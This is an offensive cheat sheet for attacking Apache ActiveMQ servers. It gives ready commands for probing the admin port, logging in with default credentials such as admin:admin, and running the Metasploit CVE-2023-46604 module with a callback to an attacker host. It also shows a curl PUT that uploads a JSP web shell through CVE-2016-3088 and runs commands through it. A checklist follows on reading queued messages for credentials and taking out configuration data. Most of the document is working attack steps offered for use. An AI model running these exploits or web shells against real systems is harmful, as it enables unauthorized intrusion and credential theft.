# ACTIVEMQ ENUMERATION (Port 8161)

## SERVICE OVERVIEW
```
Apache ActiveMQ - message broker
- Default admin port: 8161 (HTTP)
- Message broker port: 61616
- Default credentials: admin:admin
- Multiple critical RCE vulnerabilities!
```

## DETECTION
```bash
nmap -sV -p8161 <IP>
curl http://<IP>:8161
curl http://<IP>:8161/admin
```

## DEFAULT CREDENTIALS
```bash
# Default ActiveMQ credentials
admin:admin
admin:password
activemq:activemq

# Test login
curl -u admin:admin http://<IP>:8161/admin
```

## CRITICAL VULNERABILITIES
```bash
# CVE-2023-46604: CRITICAL RCE (ActiveMQ < 5.18.3, < 5.17.6)
# Unauthenticated RCE via OpenWire protocol!

# Exploit with Metasploit
use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
set RHOSTS <IP>
set RPORT 61616
set LHOST <attacker_IP>
exploit

# CVE-2016-3088: File upload RCE
# Upload web shell via fileserver

# CVE-2015-5254: Deserialization RCE
searchsploit activemq
```

## EXPLOITATION
```bash
# After login to admin panel:
# 1. Read all messages (credentials, tokens!)
# 2. Manipulate message queues
# 3. Upload web shell (CVE-2016-3088)

# File upload exploit (CVE-2016-3088)
curl -u admin:admin -X PUT http://<IP>:8161/fileserver/shell.jsp \
  -H "Content-Type: application/octet-stream" \
  --data-binary @shell.jsp

# Access shell
curl http://<IP>:8161/fileserver/shell.jsp?cmd=whoami
```

## QUICK WIN CHECKLIST
```
☐ Test admin:admin credentials
☐ Check ActiveMQ version
☐ Test CVE-2023-46604 (critical RCE!)
☐ Test CVE-2016-3088 (file upload)
☐ Read messages from queues
☐ Upload web shell
☐ Extract configuration/credentials
```

## CRITICAL PRIORITY
```
ActiveMQ has CRITICAL RCE vulnerabilities!
CVE-2023-46604 = Unauthenticated RCE
Always test first!
```
